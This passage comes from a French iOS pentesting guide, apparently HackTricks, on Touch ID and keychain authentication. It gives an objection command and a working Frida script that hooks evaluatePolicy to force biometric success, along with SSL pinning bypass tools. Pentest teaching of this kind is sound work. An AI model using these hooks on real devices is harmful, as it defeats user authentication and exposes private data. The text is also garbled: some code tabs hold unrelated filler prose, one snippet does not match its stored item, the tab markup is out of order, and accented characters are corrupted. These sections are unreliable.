* `deviceOwnerAuthenticationWithBiometrics` (Swift) ou `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C) : L'authentification est limit√©e aux donn√©es biom√©triques o√π l'utilisateur est invit√© √† utiliser Touch ID.

La fonction **`evaluatePolicy` renvoie une valeur bool√©enne** indiquant si l'utilisateur s'est authentifi√© avec succ√®s. Cela signifie qu'il peut √™tre facilement contourn√© (voir ci-dessous)

### Authentification locale en utilisant le trousseau

Les **API du trousseau iOS peuvent (et doivent) √™tre utilis√©es pour mettre en ≈ìuvre l'authentification locale**. Pendant ce processus, l'application stocke soit un jeton d'authentification secret, soit une autre donn√©e secr√®te identifiant l'utilisateur dans le trousseau. Pour s'authentifier aupr√®s d'un service distant, l'utilisateur doit d√©verrouiller le trousseau en utilisant son mot de passe ou son empreinte digitale pour obtenir les donn√©es secr√®tes.

Le trousseau permet de sauvegarder des √©l√©ments avec l'attribut sp√©cial `SecAccessControl`, qui permettra l'acc√®s √† l'√©l√©ment du trousseau uniquement apr√®s que l'utilisateur ait r√©ussi l'authentification Touch ID (ou le code d'acc√®s, si une telle solution de secours est autoris√©e par les param√®tres de l'attribut).

Dans l'exemple suivant, nous sauvegarderons la cha√Æne "test\_strong\_password" dans le trousseau. La cha√Æne ne peut √™tre acc√©d√©e que sur l'appareil actuel lorsque le code d'acc√®s est d√©fini (param√®tre `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`) et apr√®s l'authentification Touch ID pour les empreintes digitales actuellement enregistr√©es uniquement (param√®tre `SecAccessControlCreateFlags.biometryCurrentSet`):

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

Le langage de programmation Objective-C est utilis√© pour d√©velopper des applications iOS. Il est bas√© sur le langage C et ajoute des fonctionnalit√©s sp√©cifiques √† la programmation orient√©e objet. Voici quelques points importants √† retenir lors de l'analyse de l'application iOS :

- **Fichiers source Objective-C** : Les fichiers source Objective-C ont l'extension `.m` et contiennent le code source de l'application iOS. Ils peuvent √™tre analys√©s pour identifier les vuln√©rabilit√©s potentielles.

- **M√©thodes sensibles** : Les m√©thodes sensibles, telles que celles li√©es √† l'authentification, au chiffrement ou √† l'acc√®s aux donn√©es sensibles, doivent √™tre examin√©es attentivement pour d√©tecter d'√©ventuelles vuln√©rabilit√©s.

- **Gestion de la m√©moire** : Objective-C utilise le comptage de r√©f√©rences pour g√©rer la m√©moire. Il est important de v√©rifier si les objets sont correctement lib√©r√©s de la m√©moire pour √©viter les fuites de m√©moire.

- **Communication r√©seau** : Les applications iOS peuvent communiquer avec des serveurs distants via des requ√™tes HTTP ou d'autres protocoles. Il est essentiel de v√©rifier si les communications r√©seau sont s√©curis√©es et si les donn√©es sont correctement chiffr√©es.

- **Stockage local** : Les applications iOS peuvent stocker des donn√©es localement sur l'appareil. Il est important de v√©rifier si les donn√©es sensibles sont correctement prot√©g√©es et si les fichiers temporaires sont correctement supprim√©s apr√®s utilisation.

- **Analyse des d√©pendances** : Les applications iOS peuvent utiliser des biblioth√®ques tierces. Il est important de v√©rifier si ces biblioth√®ques sont √† jour et si elles pr√©sentent des vuln√©rabilit√©s connues.

- **Analyse des erreurs** : Les erreurs de programmation peuvent r√©v√©ler des informations sensibles ou conduire √† des vuln√©rabilit√©s. Il est important d'analyser les messages d'erreur et les journaux pour d√©tecter d'√©ventuelles faiblesses.

- **Tests de s√©curit√©** : Les tests de s√©curit√©, tels que les tests d'injection de code, les tests d'authentification, les tests de chiffrement et les tests de manipulation de donn√©es, doivent √™tre effectu√©s pour identifier les vuln√©rabilit√©s potentielles.

En utilisant ces techniques d'analyse, vous pouvez identifier les vuln√©rabilit√©s potentielles dans les applications iOS et prendre les mesures n√©cessaires pour les corriger.

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Swift" %}

Maintenant, nous pouvons demander l'√©l√©ment enregistr√© dans le trousseau. Les services du trousseau pr√©senteront la bo√Æte de dialogue d'authentification √† l'utilisateur et renverront les donn√©es ou nil en fonction de la fourniture ou non d'une empreinte digitale appropri√©e.

```swift
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrService as String: "MyApp",
    kSecAttrAccount as String: "username",
    kSecReturnData as String: true
]

var item: CFTypeRef?
let status = SecItemCopyMatching(query as CFDictionary, &item)

if status == errSecSuccess {
    let passwordData = item as! Data
    let password = String(data: passwordData, encoding: .utf8)
    print("Password: \(password ?? "")")
} else {
    print("Failed to retrieve password: \(status)")
}
```

{% endtab %}
{% endtabs %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

Le langage de programmation Objective-C est utilis√© pour d√©velopper des applications iOS. Il est bas√© sur le langage C et ajoute des fonctionnalit√©s sp√©cifiques √† la programmation orient√©e objet. Pour effectuer des tests de p√©n√©tration sur des applications iOS, il est important de comprendre les concepts de base d'Objective-C.

Voici quelques points cl√©s √† retenir :

- Les classes et les objets sont les √©l√©ments de base d'Objective-C. Une classe est un mod√®le pour cr√©er des objets, qui sont des instances de cette classe.
- Les m√©thodes sont des fonctions qui sont associ√©es √† une classe ou √† un objet. Elles sont utilis√©es pour effectuer des op√©rations sp√©cifiques.
- Les propri√©t√©s sont des variables qui sont associ√©es √† une classe ou √† un objet. Elles sont utilis√©es pour stocker des donn√©es.
- Les messages sont utilis√©s pour communiquer entre les objets. Un message est envoy√© √† un objet pour lui demander d'ex√©cuter une m√©thode sp√©cifique.
- Les protocoles sont des interfaces qui d√©finissent un ensemble de m√©thodes que les classes peuvent impl√©menter. Ils sont utilis√©s pour d√©finir des contrats entre les objets.

En comprenant ces concepts de base, vous serez en mesure de comprendre et de manipuler le code Objective-C lors de vos tests de p√©n√©tration sur des applications iOS.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### D√©tection

L'utilisation de frameworks dans une application peut √©galement √™tre d√©tect√©e en analysant la liste des biblioth√®ques dynamiques partag√©es de l'application binaire. Cela peut √™tre fait en utilisant `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Si `LocalAuthentication.framework` est utilis√© dans une application, la sortie contiendra les deux lignes suivantes (n'oubliez pas que `LocalAuthentication.framework` utilise `Security.framework` en interne):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Si `Security.framework` est utilis√©, seul le deuxi√®me sera affich√©.

### Contournement du framework d'authentification locale

#### Objection

[**Objection Biometrics Bypass**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) peut √™tre utilis√© pour contourner LocalAuthentication. Objection **utilise Frida pour instrumenter la fonction `evaluatePolicy` afin qu'elle renvoie `True`** m√™me si l'authentification n'a pas √©t√© effectu√©e avec succ√®s. Utilisez la commande `ios ui biometrics_bypass` pour contourner l'authentification biom√©trique non s√©curis√©e. Objection enregistrera un travail, qui remplacera le r√©sultat de `evaluatePolicy`. Cela fonctionnera √† la fois dans les impl√©mentations Swift et Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Si vuln√©rable, le module contournera automatiquement le formulaire de connexion.

#### Frida

Un exemple d'utilisation de **`evaluatePolicy`** de l'application [DVIA-v2](https://github.com/prateek147/DVIA-v2) :
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Pour contourner l'authentification locale, nous devons √©crire un script Frida qui **contourne** la v√©rification **evaluatePolicy** mentionn√©e ci-dessus. Comme vous pouvez le voir dans l'extrait de code ci-dessus, **evaluatePolicy** utilise un **callback** qui d√©termine le **r√©sultat**. Donc, la fa√ßon la plus simple de r√©aliser le piratage est d'intercepter ce callback et de vous assurer qu'il renvoie toujours **success=1**.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposition de fonctionnalit√©s sensibles via IPC

### Gestionnaires d'URI personnalis√©s / Liens profonds / Sch√©mas personnalis√©s

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Liens universels

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Partage d'activit√©s UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extensions d'application

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### S√©rialisation et encodage

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Communication r√©seau

Il est important de v√©rifier qu'aucune communication ne se produit **sans chiffrement** et √©galement que l'application valide correctement le **certificat TLS** du serveur.\
Pour v√©rifier ce type de probl√®mes, vous pouvez utiliser un proxy comme **Burp** :

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### V√©rification du nom d'h√¥te

Un probl√®me courant lors de la validation du certificat TLS est de v√©rifier si le certificat a √©t√© sign√© par une **autorit√© de confiance**, mais de **ne pas v√©rifier** si **le nom d'h√¥te** du certificat correspond au nom d'h√¥te qui est acc√©d√©.\
Pour v√©rifier ce probl√®me √† l'aide de Burp, apr√®s avoir fait confiance √† l'autorit√© de certification de Burp sur l'iPhone, vous pouvez **cr√©er un nouveau certificat avec Burp pour un nom d'h√¥te diff√©rent** et l'utiliser. Si l'application fonctionne toujours, alors quelque chose est vuln√©rable.

### √âpinglage de certificat

Si une application utilise correctement l'√©pinglage SSL, alors l'application ne fonctionnera que si le certificat est celui qui est attendu. Lors du test d'une application, **cela peut poser probl√®me car Burp servira son propre certificat**.\
Pour contourner cette protection sur un appareil jailbreak√©, vous pouvez installer l'application [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ou installer [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device).

Vous pouvez √©galement utiliser la commande `ios sslpinning disable` de **objection**.

## Divers

* Dans **`/System/Library`**, vous pouvez trouver les frameworks install√©s sur le t√©l√©phone utilis√©s par les applications syst√®me.
* Les applications install√©es par l'utilisateur depuis l'App Store se trouvent dans **`/User/Applications`**.
* Et **`/User/Library`** contient les donn√©es enregistr√©es par les applications de niveau utilisateur.
* Vous pouvez acc√©der √† **`/User/Library/Notes/notes.sqlite`** pour lire les notes enregistr√©es dans l'application.
* √Ä l'int√©rieur du dossier d'une application install√©e (**`/User/Applications/<ID DE L'APP>/`**), vous pouvez trouver des fichiers int√©ressants :
* **`iTunesArtwork`** : L'ic√¥ne utilis√©e par l'application.
* **`iTunesMetadata.plist`** : Informations sur l'application utilis√©es dans l'App Store.
* **`/Library/*`** : Contient les pr√©f√©rences et le cache. Dans **`/Library/Cache/Snapshots/*`**, vous pouvez trouver la capture d'√©cran effectu√©e par l'application avant de l'envoyer en arri√®re-plan.

### Patch √† chaud / Mise √† jour forc√©e

Les d√©veloppeurs peuvent **corriger √† distance toutes les installations de leur application instantan√©ment**, sans avoir √† soumettre √† nouveau l'application √† l'App Store et attendre qu'elle soit approuv√©e.\
√Ä cette fin, on utilise g√©n√©ralement [**JSPatch**](https://github.com/bang590/JSPatch)**.** Mais il existe √©galement d'autres options telles que [Siren](https://github.com/ArtSabintsev/Siren) et [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Il s'agit d'un m√©canisme dangereux qui pourrait √™tre utilis√© de mani√®re abusive par des SDK tiers malveillants, il est donc recommand√© de v√©rifier quelle m√©thode est utilis√©e pour la mise √† jour automatique (le cas √©ch√©ant) et de la tester.** Vous pouvez essayer de t√©l√©charger une version pr√©c√©dente de l'application √† cette fin.

### Tiers

Un probl√®me des SDK tiers est qu'il n'y a **aucun contr√¥le granulaire sur les fonctionnalit√©s offertes par le SDK**. Vous pouvez utiliser le SDK et avoir toutes les fonctionnalit√©s (y compris les fuites de diagnostic et les connexions HTTP non s√©curis√©es), ou ne pas l'utiliser du tout. De plus, il est g√©n√©ralement impossible pour les d√©veloppeurs d'applications de **corriger une vuln√©rabilit√©** dans le SDK.\
De plus, certains SDK commencent √† **contenir des logiciels malveillants une fois qu'ils sont tr√®s fiables** pour la communaut√©.

De plus, les services propos√©s par ces SDK peuvent impliquer des **services de suivi pour surveiller le comportement de l'utilisateur** lors de l'utilisation de l'application, la vente de banni√®res publicitaires ou l'am√©lioration de l'exp√©rience utilisateur. L'inconv√©nient des services tiers est que les d√©veloppeurs ne connaissent pas les d√©tails du code ex√©cut√© via les biblioth√®ques tierces. Par cons√©quent, seules les informations n√©cessaires doivent √™tre envoy√©es √† un service, et aucune information sensible ne doit √™tre divulgu√©e.

L'inconv√©nient est qu'un **d√©veloppeur ne conna√Æt pas en d√©tail le code ex√©cut√© via les biblioth√®ques tierces** et renonce donc √† la visibilit√©. Par cons√©quent, il convient de s'assurer que seules les informations n√©cessaires sont envoy√©es au service et qu'aucune information sensible n'est divulgu√©e.

La plupart des services tiers sont impl√©ment√©s de deux mani√®res :

* avec une biblioth√®que autonome
* avec un SDK complet

Toutes les donn√©es envoy√©es aux services tiers doivent √™tre anonymis√©es pour √©viter la divulgation d'informations personnellement identifiables (PII) qui permettraient au tiers de identifier le compte utilisateur.

Vous pouvez trouver les **biblioth√®ques utilis√©es par une application** en ex√©cutant **`otool`** sur l'application (et en l'ex√©cutant sur chaque biblioth√®que partag√©e pour trouver d'autres biblioth√®ques partag√©es utilis√©es).

## **R√©f√©rences**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
## Plus d'informations

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Cours gratuit sur iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Version Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Version Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
